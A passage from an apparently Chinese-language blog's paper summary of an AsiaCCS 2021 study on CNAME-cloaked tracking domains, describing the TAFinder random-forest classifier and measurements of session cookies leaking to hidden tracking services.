cookie，然后通过Cookiepedia或T/A特定的方式进行访问。基于这种方法，作者发现了27个跟踪相关的cookies和28个默认的网络应用程序cookies。</p><p>为了对隐匿域进行分类，TAFinder使用Scikit-Learn的随机森林模型。</p><h1 id="方法评估"><a href="#方法评估" class="headerlink" title="方法评估"></a>方法评估</h1><p>在21,184个使用CNAME的网站中，有20,504个仅使用了提供非T/A服务CNAME。根据Virus Total，这些非T/A大多属于信息技术、商业和计算机及软件类别，包括CDN和虚拟主机服务。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/4941ede8-c1f7-4f34-bede-bab062c19044.png"><br>在评估Cookies泄露的时候由于每个分析站点都需要人工操作，因此作者将实验限制在10,000个最流行的域上。在过滤了金融服务和购物网站之后，作者使用119个域进行分析。其中的90个网站上作者手动创建了帐户用于测试。在这90个网站中，有27个将其会话cookie（我们确认该cookie提供了对用户帐户的访问）发送至隐匿的T/A服务。<br><img src="https://blog-1253481369.cos.ap-chengdu.myqcloud.com/img/13366964-df26-49df-aae5-18865dffc844.png"></p>]]></content>
      
      
      <categories>
          
          <category> Paper Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ML </tag>
            
            <tag> AsiaCCS 2021 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
